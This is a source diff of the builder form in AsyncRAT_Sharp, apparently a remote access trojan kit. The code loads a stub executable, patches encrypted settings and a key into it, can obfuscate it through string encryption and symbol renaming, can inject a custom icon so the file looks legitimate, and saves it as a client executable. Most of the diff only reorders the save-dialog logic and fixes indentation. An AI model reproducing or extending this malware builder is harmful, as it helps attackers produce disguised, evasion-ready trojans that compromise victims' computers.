@@ -187,36 +187,33 @@ namespace AsyncRAT_Sharp.Forms
             try
             {
                 using (ModuleDefMD asmDef = ModuleDefMD.Load(@"Stub/Stub.exe"))
+                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                 {
-                    WriteSettings(asmDef);
-
-                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
+                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
+                    saveFileDialog1.InitialDirectory = Application.StartupPath;
+                    saveFileDialog1.OverwritePrompt = false;
+                    saveFileDialog1.FileName = "Client";
+                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                     {
-                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
-                        saveFileDialog1.InitialDirectory = Application.StartupPath;
-                        saveFileDialog1.OverwritePrompt = false;
-                        saveFileDialog1.FileName = "Client";
-                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
+                        WriteSettings(asmDef);
+                        if (chkObfu.Checked)
                         {
-                            if (chkObfu.Checked)
-                            {
-                                EncryptString.DoEncrypt(asmDef);
-                                Renaming.DoRenaming(asmDef);
-                            }
-                            asmDef.Write(saveFileDialog1.FileName);
-                            asmDef.Dispose();
-                            if (btnAssembly.Checked)
-                            {
-                                WriteAssembly(saveFileDialog1.FileName);
-                            }
-                            if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
-                            {
-                                IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
-                            }
-                            MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                            SaveSettings();
-                            this.Close();
+                            EncryptString.DoEncrypt(asmDef);
+                            Renaming.DoRenaming(asmDef);
                         }
+                        asmDef.Write(saveFileDialog1.FileName);
+                        asmDef.Dispose();
+                        if (btnAssembly.Checked)
+                        {
+                            WriteAssembly(saveFileDialog1.FileName);
+                        }
+                        if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
+                        {
+                            IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
+                        }
+                        MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        SaveSettings();
+                        this.Close();
                     }
                 }
             }
@@ -327,8 +324,6 @@ namespace AsyncRAT_Sharp.Forms
                 signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
             }
 
-
-
             foreach (TypeDef type in asmDef.Types)
             {
                 if (type.Name == "Settings")
@@ -385,7 +380,7 @@ namespace AsyncRAT_Sharp.Forms
                                     method.Body.Instructions[i].Operand = textFilename.Text;
 
                                 if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
-                                    method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("AsyncRAT ",""));
+                                    method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("AsyncRAT ", ""));
 
                                 if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
                                     method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
@@ -417,19 +412,19 @@ namespace AsyncRAT_Sharp.Forms
         }
 
 
-            private readonly Random random = new Random();
-            const string alphabet = "asdfghjklqwertyuiopmnbvcxz";
+        private readonly Random random = new Random();
+        const string alphabet = "asdfghjklqwertyuiopmnbvcxz";
 
-            public string getRandomCharacters()
+        public string getRandomCharacters()
+        {
+            var sb = new StringBuilder();
+            for (int i = 1; i <= new Random().Next(10, 20); i++)
             {
-                var sb = new StringBuilder();
-                for (int i = 1; i <= new Random().Next(10,20); i++)
-                {
-                    var randomCharacterPosition = random.Next(0, alphabet.Length);
-                    sb.Append(alphabet[randomCharacterPosition]);
-                }
-                return sb.ToString();
+                var randomCharacterPosition = random.Next(0, alphabet.Length);
+                sb.Append(alphabet[randomCharacterPosition]);
             }
+            return sb.ToString();
+        }
 
     }
 }
